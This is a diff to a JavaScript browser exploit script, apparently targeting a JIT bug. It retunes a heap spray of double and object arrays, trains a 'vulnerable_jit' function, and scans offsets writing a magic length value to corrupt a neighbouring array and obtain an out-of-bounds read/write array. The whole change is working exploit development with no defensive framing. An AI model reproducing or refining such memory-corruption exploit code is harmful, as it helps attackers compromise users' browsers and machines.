@@ -121,7 +121,7 @@
     }
 
     function forceGC() {
-        for (let i = 0; i < 100; i++) new ArrayBuffer(0x100000);
+        for (let i = 0; i < 200; i++) new ArrayBuffer(0x100000);
     }
 
     // ==========================================
@@ -258,12 +258,13 @@
     }
 
     function triggerOOB() {
-        logger.info("Triggering OOB (Multi-Shot Strategy)...");
+        logger.info("Triggering OOB (Deep Scan Strategy)...");
         global_arrays = []; 
         
-        // Increase allocation to 0x4000 (16384 arrays)
+        // Allocate 16384 arrays
+        // CHANGED: Use larger Double Arrays (96) to align better
         for (let i = 0; i < 0x4000; i++) { 
-            let dbl_arr = new Array(16).fill(1.1);
+            let dbl_arr = new Array(96).fill(1.1);
             let obj_arr = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}];
             global_arrays.push({ d: dbl_arr, o: obj_arr });
         }
@@ -277,45 +278,35 @@
         // Train JIT
         for (let i = 0; i < 10000; i++) vulnerable_jit(global_arrays[0].d, 0, 1.1);
 
-        logger.warn("Firing 'Machine Gun' (Candidates 100-2000)...");
+        logger.warn("Deep Scanning Candidates 1024-1050...");
         
         try {
-            // Magic length 0x13370
             let magic_len = i2f(0x13370, 0x00000000); 
 
-            // STRATEGY CHANGE:
-            // Iterate through MANY array candidates, not just one.
-            // Iterate through indices 100 to 2000
-            for (let idx = 100; idx < 2000; idx += 4) {
+            // STRATEGY: Deep Scan
+            // Focus on a stable region (index 1024)
+            // Try fewer candidates (25), but scan DEEP (4096 offsets)
+            for (let idx = 1024; idx < 1050; idx++) {
                 let target_array = global_arrays[idx].d;
                 
-                // For each candidate, check small offset range (0-32)
-                // Neighbor is likely very close.
-                for (let offset = 0; offset < 32; offset++) {
+                // Visual heartbeat every 5 candidates so user knows it's not frozen
+                if ((idx - 1024) % 5 === 0) logger.info(`Scanning candidate ${idx}...`);
+
+                // Deep scan: 0 to 4096 (covers 32KB ahead)
+                for (let offset = 0; offset < 4096; offset++) {
                     vulnerable_jit(target_array, offset, magic_len);
                 }
 
-                // Check for successful corruption occasionally
-                if (idx % 100 === 0) {
-                     for (let i = 0; i < global_arrays.length; i++) {
-                        if (global_arrays[i].d.length > 0x1000) {
-                            logger.success(`SUCCESS! Found massive array at index ${i} (Triggered by candidate ~${idx})`);
-                            oob_master = global_arrays[i].d;
-                            return true;
-                        }
+                // Check for success immediately after this candidate finishes scan
+                for (let i = 0; i < global_arrays.length; i++) {
+                    if (global_arrays[i].d.length > 0x1000) {
+                        logger.success(`SUCCESS! Found massive array at index ${i}`);
+                        oob_master = global_arrays[i].d;
+                        return true;
                     }
                 }
             }
             
-            // Final Scan
-            for (let i = 0; i < global_arrays.length; i++) {
-                if (global_arrays[i].d.length > 0x1000) {
-                    logger.success(`SUCCESS! Found massive array at index ${i}`);
-                    oob_master = global_arrays[i].d;
-                    return true;
-                }
-            }
-
             logger.error("Attack finished. No corruption detected.");
             return false;
         } catch (e) {
